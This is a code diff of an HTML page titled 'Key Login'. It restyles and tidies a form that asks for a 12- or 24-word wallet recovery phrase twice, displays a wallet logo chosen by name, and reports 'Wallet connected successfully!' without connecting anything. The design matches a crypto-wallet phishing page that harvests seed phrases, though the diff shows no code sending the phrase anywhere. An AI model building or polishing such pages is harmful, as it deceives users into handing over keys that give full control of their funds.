@@ -6,7 +6,6 @@
     <title>Key Login</title>
 
     <style>
-      /* PAGE CENTER SETUP */
       body {
         margin: 0;
         padding: 0;
@@ -25,7 +24,6 @@
         color: #bfffe9;
       }
 
-      /* LOGIN CARD */
       .card {
         background: #003228;
         width: 90%;
@@ -36,7 +34,6 @@
         box-shadow: 0 0 20px rgba(0, 255, 200, 0.25);
       }
 
-      /* LOGO */
       .logo {
         width: 90px;
         height: 90px;
@@ -44,7 +41,6 @@
         margin-bottom: 15px;
       }
 
-      /* WALLET TITLE */
       h2 {
         margin: 10px 0 20px;
         font-size: 24px;
@@ -52,8 +48,7 @@
         color: #bfffe9;
       }
 
-      /* INPUT BOX */
-      .input-box {
+      textarea {
         width: 92%;
         padding: 12px;
         margin: 10px 0;
@@ -62,26 +57,15 @@
         border: 2px solid #00e6c3;
         color: #bfffe9;
         font-size: 15px;
-      }
-
-      .input-box::placeholder {
-        color: #bfffe9;
-      }
-
-      textarea {
-        width: 100%;
-        padding: 12px;
-        margin-top: 10px;
-        border: 1px solid #fff;
-        border-radius: 8px;
-        background: rgba(255, 255, 255, 0.15);
-        color: white;
         resize: none;
         overflow: hidden;
         min-height: 60px;
       }
 
-      /* CHECKBOX ROW */
+      textarea::placeholder {
+        color: #bfffe9;
+      }
+
       .checkbox {
         display: flex;
         align-items: center;
@@ -90,7 +74,6 @@
         color: white;
       }
 
-      /* BUTTON */
       .btn {
         width: 100%;
         padding: 12px;
@@ -109,7 +92,6 @@
         box-shadow: 0 0 12px #11ffee;
       }
 
-      /* POPUP STYLE */
       #popup {
         display: none;
         position: fixed;
@@ -123,14 +105,14 @@
         text-align: center;
         border: 2px solid #00e6c3;
         box-shadow: 0 0 15px #00e6c3;
-        z-index: 9999;
+        z-index: 999;
       }
 
       #popup button {
         margin-top: 12px;
         padding: 10px 22px;
         border: none;
-        border-radius: 10px;
+        border-radius: 8px;
         background: #00e6c3;
         color: black;
         font-weight: bold;
@@ -146,19 +128,13 @@
 
       <textarea
         id="phrase1"
-        class="input-box"
         placeholder="Enter wallet phrase (12 or 24 words)"
       ></textarea>
-
-      <textarea
-        id="phrase2"
-        class="input-box"
-        placeholder="Confirm wallet phrase"
-      ></textarea>
+      <textarea id="phrase2" placeholder="Confirm wallet phrase"></textarea>
 
       <label class="checkbox">
-        <input type="checkbox" id="confirmCheck" /> Are you sure you entered
-        correctly?
+        <input type="checkbox" id="confirmCheck" />
+        Are you sure you entered correctly?
       </label>
 
       <button class="btn" onclick="validateForm()">Connect Wallet</button>
@@ -178,10 +154,8 @@
 
       let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
       document.getElementById("walletLogo").src = "wallet-icons/" + imgName;
-    </script>
 
-    <script>
-      // AUTO EXPAND TEXTAREA
+      // Auto expand textareas
       document.querySelectorAll("textarea").forEach((box) => {
         box.addEventListener("input", () => {
           box.style.height = "auto";
@@ -189,26 +163,26 @@
         });
       });
 
-      // VALIDATION + POPUP
       function validateForm() {
-        const p1 = document.getElementById("phrase1").value.trim();
-        const p2 = document.getElementById("phrase2").value.trim();
-        const check = document.getElementById("confirmCheck").checked;
+        const p1 = phrase1.value.trim();
+        const p2 = phrase2.value.trim();
+        const check = confirmCheck.checked;
 
-        if (p1 === "") return showPopup("Please fill out this field.");
+        if (p1 === "") return showPopup("Please enter your phrase.");
         if (p2 === "") return showPopup("Please confirm the phrase.");
+        if (p1 !== p2) return showPopup("Phrases do not match.");
         if (!check) return showPopup("Please tick the confirmation checkbox.");
 
         showPopup("Wallet connected successfully!");
       }
 
       function showPopup(msg) {
-        document.getElementById("popupMsg").innerText = msg;
-        document.getElementById("popup").style.display = "block";
+        popupMsg.innerText = msg;
+        popup.style.display = "block";
       }
 
       function closePopup() {
-        document.getElementById("popup").style.display = "none";
+        popup.style.display = "none";
       }
     </script>
   </body>
